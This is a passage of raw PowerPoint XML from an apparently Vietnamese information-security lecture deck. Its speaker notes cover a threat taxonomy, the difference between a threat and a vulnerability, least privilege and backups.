              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>dọa</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>.</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="2000" i="1" kern="1200" dirty="0"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1266811" y="3840678"/>
        <a:ext cx="5147335" cy="1530376"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{5D7817A0-E7CA-4DBB-A3E8-3B88832A755A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="5852159" y="1232746"/>
          <a:ext cx="1056640" cy="1056640"/>
        </a:xfrm>
        <a:prstGeom prst="downArrow">
          <a:avLst>
            <a:gd name="adj1" fmla="val 55000"/>
            <a:gd name="adj2" fmla="val 45000"/>
          </a:avLst>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="lt1">
            <a:alpha val="90000"/>
            <a:tint val="40000"/>
            <a:hueOff val="0"/>
            <a:satOff val="0"/>
            <a:lumOff val="0"/>
            <a:alphaOff val="0"/>
          </a:schemeClr>
        </a:solidFill>
        <a:ln w="12700" cap="flat" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="accent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vi-VN" sz="3600" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6089903" y="1232746"/>
        <a:ext cx="581152" cy="795122"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{56525E79-0E53-4BB0-AF68-DA4B1569D4D1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6461759" y="3118442"/>
          <a:ext cx="1056640" cy="1056640"/>
        </a:xfrm>
        <a:prstGeom prst="downArrow">
          <a:avLst>
            <a:gd name="adj1" fmla="val 55000"/>
            <a:gd name="adj2" fmla="val 45000"/>
          </a:avLst>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="lt1">
            <a:alpha val="90000"/>
            <a:tint val="40000"/>
            <a:hueOff val="0"/>
            <a:satOff val="0"/>
            <a:lumOff val="0"/>
            <a:alphaOff val="0"/>
          </a:schemeClr>
        </a:solidFill>
        <a:ln w="12700" cap="flat" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="accent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vi-VN" sz="3600" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6699503" y="3118442"/>
        <a:ext cx="581152" cy="795122"/>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794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4143375" y="0"/>
            <a:ext cx="3170238" cy="479425"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{BA660D14-7539-4D21-8FF8-75757602B653}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/30/2018</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Footer Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="9120188"/>
            <a:ext cx="3170238" cy="47942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4143375" y="9120188"/>
            <a:ext cx="3170238" cy="479425"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{96AE2D3B-8BC0-4756-95AA-2EFC19312585}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="423324463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pPr>
              <a:defRPr/>
            </a:pPr>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pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{A3DF9180-1F03-494C-A507-A8B6A738F00B}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>8/30/2018</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Image Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="720725"/>
            <a:ext cx="6400800" cy="3600450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:prstClr val="black"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="96661" tIns="48331" rIns="96661" bIns="48331" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" noProof="0"/>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pPr>
              <a:defRPr/>
            </a:pPr>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pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="47148671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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Software_Engineering_Institute" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Not-for-profit" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Computer_emergency_response_team" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="../slides/slide29.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="../notesMasters/notesMaster1.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Federally_funded_research_and_development_centers" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/McLean,_Virginia" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Bedford,_Massachusetts" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Federally_funded_research_and_development_center" TargetMode="Externa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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://vi.wikipedia.org/wiki/M%E1%BA%A1ng_ngang_h%C3%A0ng" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://vi.wikipedia.org/wiki/M%E1%BA%A1ng" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://vi.wikipedia.org/wiki/T%E1%BA%ADp_tin" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="../slides/slide68.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="../notesMasters/notesMaster1.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://vi.wikipedia.org/wiki/M%C3%A1y_ch%E1%BB%A7" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://vi.wikipedia.org/wiki/Nh%E1%BA%AFn_tin_nhanh" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://vi.wikipedia.org/wiki/Internet" TargetMode="Externa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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4764973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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30589016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p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>4</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="425319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vi-VN" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Giải thích sự khác nhau giữa một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>nguy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>và một lỗ hổng?</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pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>6</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3409733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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>13</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2979390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Unauthorized disclosure: Exposure, Interception, Inference, Intrusion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Deception: Masquerade, Falsification, Repudiation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Disruption: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Inapacitation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, Corruption, Obstruction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Usurpation: Misappropriation, Misuse</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Tiết lộ trái phép: Sự </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tiết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lộ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>chặn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bắt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>suy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>diễn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>xâm nhập</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Lừa dối: mạo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>danh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>, giả mạo, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bỏ</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Sự gián đoạn: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vô</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hiệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hóa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hủy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hoại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>, cản trở</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chiếm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>quyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Sử</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t> dụng sai mục đích, lạm dụng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>14</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14376579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buFontTx/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Lỗi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>là:sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vào</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>toàn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vẹn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> tam </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>giác</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ATTT. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Để</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>giúp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tránh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>những</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lỗi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>này</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phải</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sử</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dụng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>quyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thiểu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thực</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sao</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lưu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>một</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cách</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thường</a:t>
